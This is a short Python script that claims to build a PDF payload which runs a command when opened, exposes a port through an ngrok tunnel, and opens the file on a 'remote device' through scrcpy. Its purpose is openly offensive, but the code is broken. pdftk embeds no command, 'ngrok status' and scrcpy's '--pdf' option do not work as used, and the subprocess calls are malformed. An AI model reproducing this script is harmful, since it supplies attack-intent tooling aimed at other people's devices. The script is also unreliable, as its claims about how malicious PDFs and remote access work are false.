import os
import subprocess

def create_ngrok_tunnel():
  """Creates a ngrok tunnel that listens on port 8080."""
  subprocess.run(["ngrok", "tcp", "8080"])

def get_ngrok_tunnel_url():
  """Gets the ngrok tunnel URL."""
  tunnel_url = subprocess.check_output(["ngrok", "status"]).decode("utf-8")
  tunnel_url = tunnel_url.split(" ")[-1]
  return tunnel_url

def create_pdf_payload(pdf_payload_path, command_file_path):
  """Creates a PDF payload file that will execute a command when opened."""
  with open(command_file_path, "r") as command_file:
    command = command_file.read()

  subprocess.run(["pdftk", command_file_path, "output", pdf_payload_path])

def open_pdf_payload_in_background(pdf_payload_path):
  """Opens the PDF payload file in the background."""
  subprocess.Popen(["xdg-open", pdf_payload_path], "&")

def print_ngrok_tunnel_url():
  """Prints the ngrok tunnel URL."""
  print("Your ngrok tunnel is {}".format(get_ngrok_tunnel_url()))

def open_pdf_payload_in_remote_device(pdf_payload_path):
  """Opens the PDF payload file in a remote device and displays it on your screen."""
  subprocess.run(["scrcpy", "--pdf", pdf_payload_path])

if __name__ == "__main__":
  create_ngrok_tunnel()
  pdf_payload_path = "/path/to/payload.pdf"
  command_file_path = "/path/to/command.txt"
  create_pdf_payload(pdf_payload_path, command_file_path)
  open_pdf_payload_in_background(pdf_payload_path)
  print_ngrok_tunnel_url()
  open_pdf_payload_in_remote_device(pdf_payload_path)
